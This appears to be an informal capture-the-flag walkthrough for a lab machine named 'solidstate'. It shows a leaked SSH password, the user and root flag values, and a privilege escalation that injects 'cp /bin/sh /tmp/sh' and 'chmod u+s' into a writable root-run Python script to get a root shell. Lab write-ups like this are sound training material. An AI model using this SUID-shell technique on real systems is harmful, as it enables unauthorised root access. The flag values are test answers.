Subject: Your Access

Dear Mindy,






Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James


after ssh

-rbash: $'\r': command not found
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
914d0a4ebc1777889b5b89a23f556fd75
mindy@solidstate:~$ 
 
 i got the flag
search for the writabale file
find / -writable -type  f 2>/dev/null | grep -v "/proc/"

i got tmp.py which was running to remove the files in tmp 

so i now i'm sure with this i can root the target

There so many methods to gain root access as in this method we copied /bin/sh inside /tmp and enabled SUID for /tmp/sh. 
It is quite simple, first, open the file through some editor for example 
nano sanitizer.pyn and replace “rm -r /tmp/*” from the following line as 
given below 

add this two lines in script
os.system('cp /bin/sh /tmp/sh')
os.system('chmod u+s /tmp/sh')



after adding this the file look like



# cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
      os.system('cp /bin/sh /tmp/sh')
      os.system('chmod u+s /tmp/sh')
except:
     sys.exit()





this will create sh file in tmp directory
lets execute it
cd /tmp
sh
./sh
id
uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)

# cd /root
# ls
root.txt
# cat root.txt	
b4c9723a28899b1c45db281d99cc87c9
# 
root flag is here////////
yoooo             i               got          the         root
